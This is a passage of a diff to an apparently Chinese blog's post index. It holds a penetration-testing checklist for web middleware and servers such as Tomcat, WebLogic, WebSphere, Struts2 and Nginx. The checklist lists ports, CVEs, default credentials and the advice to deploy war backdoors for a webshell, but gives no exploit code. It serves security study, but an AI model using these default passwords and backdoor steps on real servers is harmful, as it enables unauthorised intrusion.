+<h3 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">•   解析漏洞</span><br><span class="line">•   目录遍历</span><br><span class="line">•   端口：80</span><br></pre></td></tr></table></figure>
+<h3 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">•   https://www.seebug.org/vuldb/ssvid-92538</span><br><span class="line">•   解析漏洞</span><br><span class="line">•   目录遍历</span><br><span class="line">•   CVE-2016-1247：需要获取主机操作权限，攻击者可通过软链接任意文件来替换日志文件，从而实现提权以获取服务器的root权限。</span><br><span class="line">•   端口：80</span><br><span class="line">lighttpd</span><br><span class="line"></span><br><span class="line">•   目录遍历</span><br><span class="line">•   端口：80</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+]]></content>
+      <tags>
+        <tag>记录</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>（三）渗透技巧—数据库、缓存、消息服务</title>
     <url>/2019/04/15/%EF%BC%88%E4%B8%89%EF%BC%89%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E3%80%81%E7%BC%93%E5%AD%98%E3%80%81%E6%B6%88%E6%81%AF%E6%9C%8D%E5%8A%A1/</url>
     <content><![CDATA[<blockquote>
@@ -5309,47 +5350,6 @@
 
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-]]></content>
-      <tags>
-        <tag>记录</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>（一）渗透技巧—web</title>
-    <url>/2019/04/15/%EF%BC%88%E4%B8%80%EF%BC%89%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E2%80%94web/</url>
-    <content><![CDATA[<blockquote>
-<p>文章不记得从哪个公众号上拉下来的了</p>
-</blockquote><a id="more"></a>
-<h2 id="1、自定义-Web-应用"><a href="#1、自定义-Web-应用" class="headerlink" title="1、自定义 Web 应用"></a>1、自定义 Web 应用</h2><p>从公网直接攻击目标对外的 Web 应用，或者在授权的情况下在内网进行渗透测试，如果是入侵目的可以直接寻找注入、上传、代码执行、文件包含等高危漏洞，尝试获取系统权限，或者直接能拿到敏感数据。<br>允许扫描的话一般使用 WVS 直接扫描，也可以使用专门扫描特定漏洞的扫描工具如 sqlmap、XSStrike 等工具扫描特定类型的漏洞。不允许直接扫描，使用 Burp 手工慢慢找了。</p>
-<h2 id="2、Web-中间件"><a href="#2、Web-中间件" class="headerlink" title="2、Web 中间件"></a>2、Web 中间件</h2><h3 id="（1）Tomcat"><a href="#（1）Tomcat" class="headerlink" title="（1）Tomcat"></a>（1）Tomcat</h3><p>Tomcat是Apache Jakarta软件组织的一个子项目，Tomcat是一个JSP/Servlet容器，它是在SUN公司的JSWDK（Java Server Web Development Kit）基础上发展起来的一个JSP和Servlet规范的标准实现，使用Tomcat可以体验JSP和Servlet的最新规范。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">端口号：8080</span><br><span class="line"></span><br><span class="line">攻击方法：</span><br><span class="line">•   默认口令、弱口令，爆破，tomcat5 默认有两个角色：tomcat和role1。其中账号both、tomcat、role1的默认密码都是tomcat。弱口令一般存在5以下的版本中。</span><br><span class="line">•   在管理后台部署 war 后门文件</span><br><span class="line">•   远程代码执行漏洞</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://paper.seebug.org/399/</span><br><span class="line">http://www.freebuf.com/column/159200.html</span><br><span class="line">http://liehu.tass.com.cn/archives/836</span><br><span class="line">http://www.mottoin.com/87173.html</span><br></pre></td></tr></table></figure>
-<h3 id="（2）Jboss"><a href="#（2）Jboss" class="headerlink" title="（2）Jboss"></a>（2）Jboss</h3><p>是一个运行EJB的J2EE应用服务器。它是开放源代码的项目，遵循最新的J2EE规范。从JBoss项目开始至今，它已经从一个EJB容器发展成为一个基于的 J2EE 的一个Web 操作系统（operating system for web），它体现了 J2EE 规范中最新的技术。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">端口：8080</span><br><span class="line"></span><br><span class="line">攻击方法：</span><br><span class="line">•   弱口令，爆破</span><br><span class="line">•   管理后台部署 war 后门</span><br><span class="line">•   反序列化</span><br><span class="line">•   远程代码执行</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">http://www.vuln.cn/6300</span><br><span class="line"></span><br><span class="line">http://mobile.www.cnblogs.com/Safe3/archive/2010/01/08/1642371.html</span><br><span class="line"></span><br><span class="line">https://www.zybuluo.com/websec007/note/838374</span><br><span class="line"></span><br><span class="line">https://blog.csdn.net/u011215939/article/details/79141624</span><br></pre></td></tr></table></figure>
-<h3 id="（3）WebLogic"><a href="#（3）WebLogic" class="headerlink" title="（3）WebLogic"></a>（3）WebLogic</h3><p>WebLogic是美国Oracle公司出品的一个Application Server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">端口：7001，7002</span><br><span class="line"></span><br><span class="line">攻击方法：</span><br><span class="line">•   弱口令、爆破，弱密码一般为weblogic/Oracle@123 or weblogic</span><br><span class="line">•   管理后台部署 war 后门</span><br><span class="line">•   SSRF</span><br><span class="line">•   反序列化漏洞</span><br><span class="line">•   weblogic_uac</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf</span><br><span class="line"></span><br><span class="line">https://blog.gdssecurity.com/labs/2015/3/30/weblogic-ssrf-and-xss-cve-2014-4241-cve-2014-4210-cve-2014-4.html</span><br><span class="line"></span><br><span class="line">https://fuping.site/2017/06/05/Weblogic-Vulnerability-Verification/</span><br><span class="line"></span><br><span class="line">https://bbs.pediy.com/thread-224954.htm</span><br></pre></td></tr></table></figure>
-<h3 id="4）WebSphere"><a href="#4）WebSphere" class="headerlink" title="4）WebSphere"></a>4）WebSphere</h3><p>IBM公司一套典型的电子商务应用开发工具及运行环境。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">端口：默认端口：908*；第一个应用就是9080，第二个就是9081；控制台9090</span><br><span class="line"></span><br><span class="line">攻击方法：</span><br><span class="line">•   控制台登录爆破</span><br><span class="line">•   很多内网 websphere 的控制台存在弱口令 / 默认口令，可以使用 admin/admin 以及 webshpere/webshpere 这种口令登录。 通过该口令登录控制台后，可以部署 war 包，从而获取到 WEBSHELL 。</span><br><span class="line">•   反序列化</span><br><span class="line">•   任意文件泄露</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://loudong.sjtu.edu.cn/?keyword=WebSphere&amp;serverity=%E9%AB%98%E5%8D%B1</span><br><span class="line"></span><br><span class="line">http://www.fr1sh.com/wooyun_1/bug_detail.php?wybug_id=wooyun-2013-036803</span><br><span class="line"></span><br><span class="line">https://gist.github.com/metall0id/bb3e9bab2b7caee90cb7</span><br></pre></td></tr></table></figure>
-<h2 id="3、Web-框架"><a href="#3、Web-框架" class="headerlink" title="3、Web 框架"></a>3、Web 框架</h2><h3 id="（1）Struts2"><a href="#（1）Struts2" class="headerlink" title="（1）Struts2"></a>（1）Struts2</h3><p>Struts2是一个优雅的,可扩展的框架,用于创建企业准备的Java Web应用程序。出现的漏洞也着实的多每爆一个各大漏洞平台上就会被刷屏。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可利用漏洞：</span><br><span class="line"></span><br><span class="line">•   S2-046 CVE-2017-5638 Struts 2.3.5-2.3.31,Struts 2.5-2.5.10</span><br><span class="line">•   S2-045 CVE-2017-5638 Struts 2.3.5-2.3.31,Struts 2.5-2.5.10</span><br><span class="line">•   S2-037 CVE-2016-4438 Struts 2.3.20-2.3.28.1</span><br><span class="line">•   S2-032 CVE-2016-3081 Struts 2.3.18-2.3.28</span><br><span class="line">•   S2-020 CVE-2014-0094 Struts 2.0.0-2.3.16</span><br><span class="line">•   S2-019 CVE-2013-4316 Struts 2.0.0-2.3.15.1</span><br><span class="line">•   S2-016 CVE-2013-2251 Struts 2.0.0-2.3.15</span><br><span class="line">•   S2-013 CVE-2013-1966 Struts 2.0.0-2.3.14</span><br><span class="line">•   S2-009 CVE-2011-3923 Struts 2.0.0-2.3.1.1</span><br><span class="line">•   S2-005 CVE-2010-1870 Struts 2.0.0-2.1.8.1</span><br><span class="line">参考：</span><br><span class="line">https://github.com/hktalent/myhktools</span><br><span class="line"></span><br><span class="line">https://github.com/Lucifer1993/struts-scan</span><br><span class="line"></span><br><span class="line">https://github.com/SecureSkyTechnology/study-struts2-s2-054_055-jackson-cve-2017-7525_cve-2017-15095</span><br></pre></td></tr></table></figure>
-<h3 id="（2）Spring-框架"><a href="#（2）Spring-框架" class="headerlink" title="（2）Spring 框架"></a>（2）Spring 框架</h3><p>Spring Framework 是一个开源的Java／Java EE全功能栈（full-stack）的应用程序框架，以Apache License 2.0开源许可协议的形式发布，也有.NET平台上的移植版本。Spring Framework提供了一个简易的开发方式，这种开发方式，将避免那些可能致使底层代码变得繁杂混乱的大量的属性文件和帮助类。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可利用漏洞：</span><br><span class="line">•   CVE-2010-1622</span><br><span class="line">•   CVE-2018-1274</span><br><span class="line">•   CVE-2018-1270</span><br><span class="line">•   CVE-2018-1273</span><br><span class="line">•   反序列化</span><br><span class="line">•   目录穿越</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">http://www.inbreak.net/archives/377</span><br><span class="line"></span><br><span class="line">https://www.secpulse.com/archives/71762.html</span><br><span class="line"></span><br><span class="line">http://www.open-open.com/news/view/1225d07</span><br><span class="line"></span><br><span class="line">https://xz.aliyun.com/t/2261</span><br><span class="line"></span><br><span class="line">https://xz.aliyun.com/t/2252</span><br></pre></td></tr></table></figure>
-<h2 id="4、Web-服务器"><a href="#4、Web-服务器" class="headerlink" title="4、Web 服务器"></a>4、Web 服务器</h2><h3 id="IIS：Windows-的-WWW-服务器"><a href="#IIS：Windows-的-WWW-服务器" class="headerlink" title="IIS：Windows 的 WWW 服务器"></a>IIS：Windows 的 WWW 服务器</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">•   https://masterxsec.github.io/2017/06/07/IIS-write-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</span><br><span class="line">•   http://www.freebuf.com/articles/4908.html</span><br><span class="line">•   https://www.anquanke.com/post/id/85811</span><br><span class="line">•   IIS，开启了 WebDAV，可以直接详服务器 PUT 文件</span><br><span class="line">•   短文件名枚举漏洞</span><br><span class="line">•   远程代码执行</span><br><span class="line">•   提权漏洞</span><br><span class="line">•   解析漏洞</span><br><span class="line">•   端口：80</span><br></pre></td></tr></table></figure>
-<h3 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">•   解析漏洞</span><br><span class="line">•   目录遍历</span><br><span class="line">•   端口：80</span><br></pre></td></tr></table></figure>
-<h3 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">•   https://www.seebug.org/vuldb/ssvid-92538</span><br><span class="line">•   解析漏洞</span><br><span class="line">•   目录遍历</span><br><span class="line">•   CVE-2016-1247：需要获取主机操作权限，攻击者可通过软链接任意文件来替换日志文件，从而实现提权以获取服务器的root权限。</span><br><span class="line">•   端口：80</span><br><span class="line">lighttpd</span><br><span class="line"></span><br><span class="line">•   目录遍历</span><br><span class="line">•   端口：80</span><br></pre></td></tr></table></figure>
 
 
 
